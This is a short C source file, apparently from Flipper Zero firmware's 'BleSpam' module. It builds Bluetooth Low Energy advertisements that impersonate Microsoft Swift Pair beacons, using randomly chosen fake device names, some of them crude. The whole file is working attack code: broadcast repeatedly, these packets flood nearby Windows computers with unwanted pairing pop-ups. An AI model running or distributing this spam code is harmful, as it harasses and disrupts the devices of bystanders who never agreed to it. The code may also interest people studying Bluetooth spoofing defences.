#include "swiftpair.h"
#include "_registry.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://learn.microsoft.com/en-us/windows-hardware/design/component-guidelines/bluetooth-swift-pair

const char* swiftpair_get_name(const BleSpamMsg* _msg) {
    const SwiftpairMsg* msg = &_msg->swiftpair;
    UNUSED(msg);
    return "SwiftPair";
}

void swiftpair_make_packet(uint8_t* out_size, uint8_t** out_packet, const BleSpamMsg* _msg) {
    const SwiftpairMsg* msg = _msg ? &_msg->swiftpair : NULL;

    const char* display_name;
    if(msg && msg->display_name[0] != '\0') {
        display_name = msg->display_name;
    } else {
        const char* names[] = {
            "Assquach💦",
            "Flipper 🐬",
            "iOS 17 🍎",
            "Kink💦",
            "👉👌",
            "🔵🦷",
        };
        display_name = names[rand() % COUNT_OF(names)];
    }
    uint8_t display_name_len = strlen(display_name);

    uint8_t size = 7 + display_name_len;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x06; // Company ID (Microsoft)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x03; // Microsoft Beacon ID
    packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
    packet[i++] = 0x80; // Reserved RSSI Byte
    memcpy(&packet[i], display_name, display_name_len); // Display Name
    i += display_name_len;

    *out_size = size;
    *out_packet = packet;
}

const BleSpamProtocol ble_spam_protocol_swiftpair = {
    .icon = &I_windows,
    .get_name = swiftpair_get_name,
    .make_packet = swiftpair_make_packet,
};
